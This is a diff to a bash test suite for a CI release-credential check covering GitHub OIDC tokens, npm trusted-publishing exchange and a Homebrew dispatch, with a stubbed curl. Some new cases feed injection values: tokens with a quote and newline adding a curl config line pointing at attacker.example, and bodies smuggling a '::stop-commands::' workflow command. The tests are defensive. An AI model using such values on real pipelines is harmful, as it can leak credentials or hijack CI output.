@@ -15,7 +15,7 @@ SCRIPT="$(cd "$(dirname "$0")" && pwd)/check-release-credentials.sh"
 PLATFORMS="cli-darwin-arm64 cli-linux-x64"
 REQUEST_URL="https://token.actions.example/id?api-version=2.0"
 REQUEST_TOKEN="stub-request-token"
-ID_TOKEN="stub-id-token"
+ID_TOKEN="stub.id-token.sig"
 NPM_OIDC_TOKEN="stub-npm-oidc-token"
 TAP_TOKEN="stub-tap-token"
 TESTS_PASSED=0
@@ -46,6 +46,8 @@ STUB
 #   STUB_ID_BODY        body of the ID token response
 #   STUB_DENY           a package (URL form) with no trusted publisher, or "all"
 #   STUB_DENY_CODE      HTTP code for that package (default 404)
+#   STUB_DENY_BODY      body for that package
+#   STUB_EXCHANGE_LOST  a package (URL form) whose exchange gets no response
 #   STUB_EXCHANGE_CODE  HTTP code of an accepted exchange (default 201)
 #   STUB_EXCHANGE_BODY  body of an accepted exchange
 #   STUB_DISPATCH_CODE  HTTP code of the dispatch (default 204)
@@ -77,20 +79,27 @@ if [ "${STUB_CURL_EXIT:-0}" != 0 ]; then
   echo "curl: (7) Failed to connect" >&2
   exit "$STUB_CURL_EXIT"
 fi
+pkg="${url##*/package/}"
+if [ -n "${STUB_EXCHANGE_LOST:-}" ] && [ "$pkg" = "$STUB_EXCHANGE_LOST" ]; then
+  [ "$write_code" = 1 ] && printf '000'
+  echo "curl: (56) Recv failure" >&2
+  exit 56
+fi
 body='{"message":"not found"}'
-id_body='{"value":"stub-id-token"}'
+id_body='{"value":"stub.id-token.sig"}'
 exchange_body='{"token":"stub-npm-oidc-token"}'
+deny_body='{"message":"no trusted publisher"}'
 [ -n "${STUB_ID_BODY+set}" ] && id_body="$STUB_ID_BODY"
 [ -n "${STUB_EXCHANGE_BODY+set}" ] && exchange_body="$STUB_EXCHANGE_BODY"
+[ -n "${STUB_DENY_BODY+set}" ] && deny_body="$STUB_DENY_BODY"
 case "$method $url" in
   "GET https://token.actions.example/"*)
     if [ "$bearer" != stub-request-token ]; then code=401
     else code="${STUB_ID_CODE:-200}"; body="$id_body"; fi ;;
   "POST https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/"*)
-    pkg="${url##*/package/}"
-    if [ "$bearer" != stub-id-token ]; then code=401; body='{"message":"invalid token"}'
+    if [ "$bearer" != stub.id-token.sig ]; then code=401; body='{"message":"invalid token"}'
     elif [ "${STUB_DENY:-}" = all ] || [ "$pkg" = "${STUB_DENY:-}" ]; then
-      code="${STUB_DENY_CODE:-404}"; body='{"message":"no trusted publisher"}'
+      code="${STUB_DENY_CODE:-404}"; body="$deny_body"
     else
       code="${STUB_EXCHANGE_CODE:-201}"; body="$exchange_body"
     fi ;;
@@ -112,7 +121,10 @@ run_check() {
   shift
   export STUB_LOG="$WORK/calls.log"
   : > "$STUB_LOG"
-  OUT=$(env PATH="$WORK:$PATH" NPM_PLATFORM_PACKAGES="$PLATFORMS" \
+  # The script makes its temp file here, so a case can check that it is gone.
+  rm -rf "$WORK/tmp"
+  mkdir "$WORK/tmp"
+  OUT=$(env PATH="$WORK:$PATH" TMPDIR="$WORK/tmp" NPM_PLATFORM_PACKAGES="$PLATFORMS" \
     ACTIONS_ID_TOKEN_REQUEST_URL="$REQUEST_URL" ACTIONS_ID_TOKEN_REQUEST_TOKEN="$REQUEST_TOKEN" \
     HOMEBREW_TAP_TOKEN="$TAP_TOKEN" "$@" bash "$SCRIPT" "$mode" 2>&1 < /dev/null)
   CODE=$?
@@ -140,7 +152,7 @@ EXCHANGE="https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package"
 case_trusted_publishing_passes() {
   run_check npm
   [ "$CODE" = 0 ] &&
-    [ "$(count '^curl .*-X GET .*https://token.actions.example/id?api-version=2.0&audience=npm%3Aregistry.npmjs.org$' "$CALLS")" = 1 ] &&
+    [ "$(count '^curl .*-X GET .*https://token.actions.example/id?api-version=2.0&audience=npm%3Aregistry.npmjs.org$' "$CALLS")" = 3 ] &&
     [ "$(count '^curl .*-X POST' "$CALLS")" = 3 ] &&
     grep -q -- "-X POST .*$EXCHANGE/rskim\$" <<< "$CALLS" &&
     grep -q -- "-X POST .*$EXCHANGE/@rskim%2fcli-darwin-arm64\$" <<< "$CALLS" &&
@@ -150,7 +162,8 @@ case_trusted_publishing_passes() {
 
 case_exchange_sends_id_token_and_no_body() {
   run_check npm
-  [ "$CODE" = 0 ] && [ "$(count "^auth $REQUEST_TOKEN\$" "$CALLS")" = 1 ] &&
+  # A new ID token for each package, as npm publish gets one.
+  [ "$CODE" = 0 ] && [ "$(count "^auth $REQUEST_TOKEN\$" "$CALLS")" = 3 ] &&
     [ "$(count "^auth $ID_TOKEN\$" "$CALLS")" = 3 ] &&
     ! grep -q -- '-X POST .* -d ' <<< "$CALLS"
 }
@@ -212,13 +225,13 @@ case_no_id_token_permission_fails() {
 
 case_id_token_refused_fails() {
   run_check npm STUB_ID_CODE=403
-  [ "$CODE" = 1 ] && grep -q 'GitHub gave no OIDC ID token (HTTP 403)' <<< "$OUT" &&
+  [ "$CODE" = 1 ] && [ "$(count 'GitHub gave no valid OIDC ID token for .* (HTTP 403)' "$OUT")" = 3 ] &&
     ! grep -q -- '-X POST' <<< "$CALLS"
 }
 
 case_id_token_missing_value_fails() {
   run_check npm 'STUB_ID_BODY={"count":1}'
-  [ "$CODE" = 1 ] && grep -q 'GitHub gave no OIDC ID token (HTTP 200)' <<< "$OUT" &&
+  [ "$CODE" = 1 ] && grep -q 'GitHub gave no valid OIDC ID token for rskim (HTTP 200)' <<< "$OUT" &&
     ! grep -q -- '-X POST' <<< "$CALLS"
 }
 
@@ -253,12 +266,83 @@ case_exchange_redirect_fails() {
 
 case_no_response_fails() {
   run_check npm STUB_CURL_EXIT=7
-  [ "$CODE" = 1 ] && grep -q 'GitHub gave no OIDC ID token (HTTP 000)' <<< "$OUT"
+  [ "$CODE" = 1 ] && grep -q 'GitHub gave no valid OIDC ID token for rskim (HTTP 000)' <<< "$OUT"
 }
 
 case_no_platform_list_fails() {
   run_check npm NPM_PLATFORM_PACKAGES=
   [ "$CODE" != 0 ] && ! grep -q -- '-X POST' <<< "$CALLS"
+}
+
+case_temp_file_removed() {
+  run_check npm
+  local after_pass
+  after_pass=$(ls -A "$WORK/tmp")
+  run_check npm STUB_DENY=all
+  [ -z "$after_pass" ] && [ -z "$(ls -A "$WORK/tmp")" ] && [ "$CODE" = 1 ]
+}
+
+case_newer_npm_passes() {
+  run_check npm STUB_NPM_VERSION=11.10.0
+  local minor_code="$CODE"
+  run_check npm STUB_NPM_VERSION=12.0.0
+  [ "$minor_code" = 0 ] && [ "$CODE" = 0 ]
+}
+
+case_exchange_refused_403_fails() {
+  run_check npm STUB_DENY=all STUB_DENY_CODE=403
+  [ "$CODE" = 1 ] && [ "$(count '(HTTP 403: no trusted publisher)' "$OUT")" = 3 ]
+}
+
+case_one_exchange_lost_fails() {
+  run_check npm STUB_EXCHANGE_LOST=@rskim%2fcli-darwin-arm64
+  [ "$CODE" = 1 ] &&
+    grep -q '@rskim/cli-darwin-arm64 has no trusted publisher for this repository and workflow (HTTP 000: )' <<< "$OUT" &&
+    [ "$(count 'trusted publishing accepts this workflow' "$OUT")" = 2 ]
+}
+
+case_exchange_body_not_json_fails() {
+  run_check npm 'STUB_EXCHANGE_BODY=<html>'
+  [ "$CODE" = 1 ] && [ "$(count 'has no trusted publisher' "$OUT")" = 3 ]
+}
+
+case_exchange_two_objects_fails() {
+  run_check npm 'STUB_EXCHANGE_BODY={"token":"tok-a"}{"token":"tok-b"}'
+  [ "$CODE" = 1 ] && ! grep -q 'tok-a\|tok-b' <<< "$OUT"
+}
+
+case_exchange_second_object_ignored() {
+  # Only the second value has a token. The body must be one object, so this fails.
+  run_check npm 'STUB_EXCHANGE_BODY={"ok":true}{"token":"tok-b"}'
+  [ "$CODE" = 1 ] && [ "$(count 'has no trusted publisher' "$OUT")" = 3 ]
+}
+
+case_homebrew_token_with_newline_refused() {
+  # A token that could add a line to the curl config is never sent.
+  run_check homebrew HOMEBREW_TAP_TOKEN=$'stub-tap-token"\nurl = "https://attacker.example/x'
+  [ "$CODE" = 1 ] && grep -q '(HTTP 000' <<< "$OUT"
+}
+
+case_bad_exchange_token_fails() {
+  run_check npm STUB_EXCHANGE_BODY='{"token":"tok-a\n::stop-commands::zz"}'
+  [ "$CODE" = 1 ] && ! grep -q '^::stop-commands' <<< "$OUT" && ! grep -q 'tok-a' <<< "$OUT"
+}
+
+case_bad_id_token_fails() {
+  run_check npm STUB_ID_BODY='{"value":"aaa.bbb.ccc\"\nurl = \"https://attacker.example/x"}'
+  [ "$CODE" = 1 ] && ! grep -q -- '-X POST' <<< "$CALLS" &&
+    ! grep -q 'attacker' <<< "$OUT"
+}
+
+case_id_token_not_jwt_fails() {
+  run_check npm 'STUB_ID_BODY={"value":"not-a-jwt"}'
+  [ "$CODE" = 1 ] && ! grep -q -- '-X POST' <<< "$CALLS"
+}
+
+case_message_control_chars_removed() {
+  run_check npm STUB_DENY=all STUB_DENY_BODY='{"message":"denied\n::stop-commands::zz"}'
+  [ "$CODE" = 1 ] && ! grep -q '^::stop-commands' <<< "$OUT" &&
+    [ "$(count '(HTTP 404: denied ::stop-commands::zz)' "$OUT")" = 3 ]
 }
 
 case_homebrew_accepted_passes() {
@@ -311,6 +395,18 @@ expect "an exchange with no token in the body fails" case_exchange_without_token
 expect "a redirected exchange (HTTP 307) fails" case_exchange_redirect_fails
 expect "no response fails" case_no_response_fails
 expect "an empty platform package list fails with no exchange" case_no_platform_list_fails
+expect "the temp file is gone after a pass and after a fail" case_temp_file_removed
+expect "npm 11.10.0 and npm 12.0.0 pass" case_newer_npm_passes
+expect "a refused exchange (HTTP 403) fails" case_exchange_refused_403_fails
+expect "one exchange with no response fails for that package" case_one_exchange_lost_fails
+expect "an exchange body that is not JSON fails" case_exchange_body_not_json_fails
+expect "an exchange body with two JSON values fails and prints no token" case_exchange_two_objects_fails
+expect "a token only in a second JSON value fails" case_exchange_second_object_ignored
+expect "a token that could add a curl config line is not sent" case_homebrew_token_with_newline_refused
+expect "an exchanged token with a newline fails and prints nothing of it" case_bad_exchange_token_fails
+expect "an ID token with a quote and a newline fails with no exchange" case_bad_id_token_fails
+expect "an ID token that is not a JWT fails with no exchange" case_id_token_not_jwt_fails
+expect "control characters leave a printed message" case_message_control_chars_removed
 expect "an accepted Homebrew dispatch (HTTP 204) passes" case_homebrew_accepted_passes
 expect "a refused Homebrew dispatch (HTTP 401) fails" case_homebrew_refused_fails
 expect "a redirected Homebrew dispatch (HTTP 307) fails" case_homebrew_redirect_fails
